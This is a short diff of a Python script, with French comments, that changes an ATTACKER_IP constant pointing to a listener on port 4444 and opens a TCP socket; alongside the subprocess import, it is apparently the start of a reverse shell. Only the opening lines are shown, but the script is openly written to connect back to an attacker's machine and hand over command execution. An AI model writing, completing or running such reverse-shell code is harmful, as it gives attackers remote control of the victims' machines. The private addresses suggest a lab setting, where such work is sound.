@@ -2,7 +2,7 @@
 import socket
 import subprocess
 
-ATTACKER_IP = '192.168.56.1'  # Remplace par l'IP du listener
+ATTACKER_IP = '192.168.1.179'  # Remplace par l'IP du listener
 PORT = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
